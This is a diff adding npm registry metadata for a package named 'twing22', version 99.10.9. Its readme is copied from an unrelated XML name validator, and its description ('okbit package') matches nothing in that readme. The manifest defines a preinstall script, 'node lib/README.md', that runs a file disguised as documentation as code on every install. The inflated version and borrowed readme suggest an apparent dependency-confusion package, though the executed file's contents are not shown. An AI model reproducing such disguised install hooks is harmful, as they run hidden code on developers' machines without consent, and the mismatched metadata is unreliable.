@@ -1,0 +1,68 @@
+{
+    "_id": "twing22",
+    "name": "twing22",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "twing22",
+            "version": "99.10.9",
+            "description": "okbit package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node lib/README.md"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "twing22@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-WCEEiTyC1WF1AaUNo8jcBP+Di1zZTyEpM9MWKuwbBKIGa3tl8qhcf7n4o8SEa1/NU9ixkdS1VNGXiDZNPy3+WQ==",
+                "shasum": "ff6fca0ac463913d331a032ccbce32ec69b6f498",
+                "tarball": "https://registry.npmjs.org/twing22/-/twing22-99.10.9.tgz",
+                "fileCount": 8,
+                "unpackedSize": 29148,
+                "signatures": [
+                    {
+                        "keyid": "SHA256:jl3bwswu80PjjokCgh0o2w5c2U4LhQAE57gj9cz1kzA",
+                        "sig": "MEUCIDC0EBKGIJ++ohZINbJDUQ+bOUe6tM6KKSSIx0Q3TX09AiEA20HxQhI/sZgshJ0aZZMv7TEkA/n58peId+gHU/crkYQ="
+                    }
+                ],
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiRunnACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmrrDxAAi4/b/nDptLgqViqby1/ub337Gm58R2o/zwzX9qZ+092mHaLw\r\nNDlu7h50FnZPARBfHlFMfEXoRzWqY5iJp8KAU3PEOMayqktelpw3z4iBuDnt\r\nOeVEp4gSqebCkOdV9Vx+yFmqIPT8sv2vdep9C7R5cfdsTONMn2Je8f3vm+bG\r\nF5kQ0I3vQDbNkAJk5ajn2yeq1UbRvWPtN4aEhNtlWBs/wNSdh3hwYjt4orIV\r\ncpBb/A1NiL9DOeJxX4NS9QnsaPECgu5j1xKWXLMuN/Bt6J6C4x2WcZ1172il\r\nR2odv0poQmplScz6DfEHYOycA5qiMOAaNk1imkaI86Z8l/mLa481z4WWWOYf\r\nPDZ50wBALvTdySkdL2/3Ww3dZ9Kvk2DuP8Y9d8E1GdrJ3ep2zoz+gmeRgOZB\r\n2QG0PAk4JHfZryV63JwHjpikzaoRPSrPq4UUMZY1rUwerZeGlb0AXVkUDtWB\r\n1BNXapIYk0JMajSFG0HdxXgyW7Dsartz6B5YBhd0LTs55q4Z2W+Mdyi9ZXdt\r\nkGJZrsVBAmL2q4sPpxRjqGYcN+oreLtOLHzemTwImpZs0+a1i5aLZvUYoxgt\r\nrp2iIu2my28ROMs22hxVAZOFFhLYXGEhoujhZ4FK20WxiWcGZbJ8qNxbs9Wm\r\n0uUEFa6DPAGXITbpYXl7XMbtLRpq/F3grWc=\r\n=j7pN\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "ijapewia",
+                "email": "ijapewia@33mail.ga"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "ijapewia",
+                    "email": "ijapewia@33mail.ga"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/twing22_99.10.9_1648814567148_0.6877777436727395"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-04-01T12:02:47.146Z",
+        "99.10.9": "2022-04-01T12:02:47.289Z",
+        "modified": "2022-04-01T12:02:47.482Z"
+    },
+    "maintainers": [
+        {
+            "name": "ijapewia",
+            "email": "ijapewia@33mail.ga"
+        }
+    ],
+    "description": "okbit package",
+    "readme": "# Validate XML Names and Qualified Names\n\nThis package simply tells you whether or not a string matches the [`Name`](http://www.w3.org/TR/xml/#NT-Name) or [`QName`](http://www.w3.org/TR/xml-names/#NT-QName) productions in the XML Namespaces specification. We use it for implementing the [validate](https://dom.spec.whatwg.org/#validate) algorithm in jsdom, but you can use it for whatever you want.\n\n## Usage\n\nThis package's main module's default export takes a string and will return an object of the form `{ success, error }`, where `success` is a boolean and if it is `false`, then `error` is a string containing some hint as to where the match went wrong.\n\n```js\n\"use strict\":\nvar xnv = require(\"xml-name-validator\");\nvar assert = require(\"assert\");\n\n// Will return { success: true, error: undefined }\nxnv.name(\"x\");\nxnv.name(\":\");\nxnv.name(\"a:0\");\nxnv.name(\"a:b:c\");\n\n// Will return { success: false, error: <an explanatory string> }\nxnv.name(\"\\\\\");\nxnv.name(\"'\");\nxnv.name(\"0\");\nxnv.name(\"a!\");\n\n// Will return { success: true, error: undefined }\nxnv.qname(\"x\");\nxnv.qname(\"a0\");\nxnv.qname(\"a:b\");\n\n// Will return { success: false, error: <an explanatory string> }\nxnv.qname(\":a\");\nxnv.qname(\":b\");\nxnv.qname(\"a:b:c\");\nxnv.qname(\"a:0\");\n```\n",
+    "readmeFilename": "README.md"
+}
